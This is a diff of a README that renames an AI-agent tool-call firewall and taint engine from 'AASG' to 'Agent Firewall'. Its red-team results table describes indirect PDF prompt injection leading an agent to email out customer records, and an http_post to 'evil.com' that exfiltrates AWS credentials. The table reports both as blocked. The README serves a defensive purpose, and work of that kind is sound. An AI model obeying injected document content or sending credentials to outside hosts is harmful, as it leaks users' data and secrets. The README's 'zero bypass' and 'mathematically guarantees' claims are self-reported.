@@ -1,7 +1,7 @@
 <div align="center">
 
-# 🛡️ AASG — Autonomous Agent Security Gateway
-### *Deterministic Layer-7 Security Firewall & Dynamic Taint Engine for Autonomous AI Agents*
+# 🛡️ Agent Firewall
+### *Deterministic Layer-7 Security Gateway & Dynamic Taint Engine for Autonomous AI Agents*
 
 [![Python](https://img.shields.io/badge/Python-3.10%20%7C%203.11%20%7C%203.12%20%7C%203.14-3776AB?logo=python&logoColor=white)](https://python.org)
 [![FastAPI](https://img.shields.io/badge/FastAPI-0.100%2B-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
@@ -38,12 +38,12 @@ Traditional prompt-filtering guardrails and LLM-as-a-judge classifiers attempt t
 
 Relying on a probabilistic model to police another probabilistic model is fundamentally fragile.
 
-### The AASG Solution: Deterministic Information Flow Control (IFC)
+### The Agent Firewall Solution: Deterministic Information Flow Control (IFC)
 
-AASG intercepts all tool calls at the execution boundary. By dynamically tracking **data provenance** and **taint propagation** across multi-turn sessions, AASG mathematically guarantees that untrusted inputs cannot influence sensitive, unapproved, or external tool sinks.
+**Agent Firewall** intercepts all tool calls at the execution boundary. By dynamically tracking **data provenance** and **taint propagation** across multi-turn sessions, Agent Firewall mathematically guarantees that untrusted inputs cannot influence sensitive, unapproved, or external tool sinks.
 
 > [!IMPORTANT]
-> **Zero Probabilistic Drift:** AASG does not query an LLM to evaluate security policies. The 6-rule decision matrix is evaluated deterministically in pure Python/Pydantic, guaranteeing reproducible microsecond verdicts with 0% false block overhead.
+> **Zero Probabilistic Drift:** Agent Firewall does not query an LLM to evaluate security policies. The 6-rule decision matrix is evaluated deterministically in pure Python/Pydantic, guaranteeing reproducible microsecond verdicts with 0% false block overhead.
 
 ---
 
@@ -63,7 +63,7 @@ AASG intercepts all tool calls at the execution boundary. By dynamically trackin
 
 ## 🏛️ Architecture & The 6-Step Decision Engine
 
-AASG deploys as an inline Layer-7 security boundary between your agent runtime (LangChain, AutoGen, LlamaIndex, CrewAI, or raw OpenAI/Anthropic APIs) and tool execution sinks:
+Agent Firewall deploys as an inline Layer-7 security boundary between your agent runtime (LangChain, AutoGen, LlamaIndex, CrewAI, or raw OpenAI/Anthropic APIs) and tool execution sinks:
 
 ```mermaid
 flowchart TD
@@ -77,7 +77,7 @@ flowchart TD
         Agent --> Call["Proposed Tool Invocation<br/><code>ToolCall(tool, args)</code>"]
     end
 
-    subgraph S3 ["Stage 03: AASG Frozen 6-Rule Decision Engine"]
+    subgraph S3 ["Stage 03: Agent Firewall Frozen 6-Rule Engine"]
         Call --> R1{"Rule 1: Tool in<br/>policy.allowed_tools?"}
         R1 -- No --> B1["BLOCK<br/><code>permission_denied</code>"]
         R1 -- Yes --> R2{"Rule 2: Tool in<br/>policy.always_approve?"}
@@ -129,7 +129,7 @@ flowchart TD
 
 Evaluated across **33 comprehensive automated test suites** covering 20 red-team injection vectors and 13 multi-step legitimate enterprise workflows:
 
-| Security Metric | Baseline (Firewall OFF) | Protected (AASG ON) | Security Impact |
+| Security Metric | Baseline (Firewall OFF) | Protected (Agent Firewall ON) | Security Impact |
 | :--- | :---: | :---: | :---: |
 | **Attack Success Rate (ASR)** | **90.0%** (18/20) | **0.0%** (0/20) | **100% Reduction (Zero Bypass)** |
 | **Benign Task Completion** | **100.0%** (13/13) | **100.0%** (13/13) | **100% Business Preservation** |
@@ -149,7 +149,7 @@ Evaluated across **33 comprehensive automated test suites** covering 20 red-team
 <details>
 <summary><b>🔍 View Verified Red-Team Attack Scenarios & Outcomes</b></summary>
 
-| Attack Vector | Target Tool | Baseline Result | AASG Intercept | Verdict |
+| Attack Vector | Target Tool | Baseline Result | Agent Firewall Intercept | Verdict |
 | :--- | :--- | :--- | :--- | :---: |
 | **1. Indirect PDF Prompt Injection** | `read_doc()` → `send_email()` | Leaked customer contact records | Tagged UNTRUSTED, stopped at Rule 4 | `BLOCKED` |
 | **2. DNS / C2 Exfiltration via HTTP** | `http_post(url="evil.com")` | AWS credentials sent to external C2 | Violated Sink Whitelist (Rule 3) | `BLOCKED` |
@@ -163,7 +163,7 @@ Evaluated across **33 comprehensive automated test suites** covering 20 red-team
 
 ## 🌐 Live Web Services
 
-AASG ships with a complete web console and showcase environment:
+Agent Firewall ships with a complete web console and showcase environment:
 
 | Service | Port | URL | Description |
 | :--- | :---: | :--- | :--- |
@@ -176,7 +176,7 @@ AASG ships with a complete web console and showcase environment:
 ## 📁 Repository Structure
 
 ```
-AASG/
+agent-firewall/
 ├── agent/                       # Simulated Enterprise Agent Runtime
 │   ├── agent.py                 # Multi-turn tool execution loop
 │   ├── llm.py                   # Mock & real LLM provider wrappers
@@ -292,7 +292,7 @@ tests\test_taint.py ....                                                 [100%]
 
 ## 🔌 REST API Reference
 
-AASG exposes high-performance REST endpoints for easy integration as a sidecar proxy:
+Agent Firewall exposes high-performance REST endpoints for easy integration as a sidecar proxy:
 
 | Method | Endpoint | Request Body | Description |
 | :--- | :--- | :--- | :--- |
@@ -354,12 +354,12 @@ sinks:
 ## 🛣️ Path to Enterprise Production
 
 1. **Sidecar Proxy Middleware:** Wrap LangChain, AutoGen, CrewAI, or LlamaIndex tool dispatchers with the `/guard/tool_call` endpoint.
-2. **eBPF Kernel Quarantine:** Couple AASG with Linux eBPF socket filters to mathematically enforce that agent runtimes cannot open out-of-band TCP connections.
+2. **eBPF Kernel Quarantine:** Couple Agent Firewall with Linux eBPF socket filters to mathematically enforce that agent runtimes cannot open out-of-band TCP connections.
 3. **SIEM Streaming:** Forward structured audit events and plain-English incident rationales to Splunk, Datadog, or Microsoft Sentinel.
 4. **Corporate IAM Binding:** Synchronize approval queues with Okta, Slack webhooks, or corporate Active Directory dual-custody workflows.
 
 ---
 
 <div align="center">
-  <sub>Developed with ❤️ for Autonomous AI Agent Safety. © 2026 AASG Architecture. Zero Telemetry Leaks.</sub>
+  <sub>Developed with ❤️ for Autonomous AI Agent Safety. © 2026 Agent Firewall Architecture. Zero Telemetry Leaks.</sub>
 </div>
